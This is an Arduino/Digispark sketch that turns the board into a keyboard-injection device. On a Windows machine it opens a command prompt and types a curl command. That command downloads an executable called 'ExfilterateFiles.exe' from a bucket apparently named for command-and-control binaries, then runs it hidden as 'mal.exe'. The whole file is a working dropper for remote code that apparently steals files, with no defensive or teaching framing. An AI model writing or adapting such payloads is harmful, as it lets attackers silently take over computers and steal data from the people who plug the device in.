#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  openCmd();

  typeCommand("cd %tmp%");
  typeCommand("curl https://c2-binaries.s3.us-east-2.amazonaws.com/ExfilterateFiles.exe --output mal.exe && start /B ./mal.exe && exit");


  
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
  DigiKeyboard.delay(500000);
}

void openCmd() {
  // Send the GUI key and 'r' to open the run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100); // Short delay

  typeCommand("cmd");
  DigiKeyboard.delay(1000);

}

void typeCommand(String str){
    // Type "cmd"
  DigiKeyboard.print(str);
  DigiKeyboard.delay(100); // Short delay

  // Press Enter
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200); // Short delay

}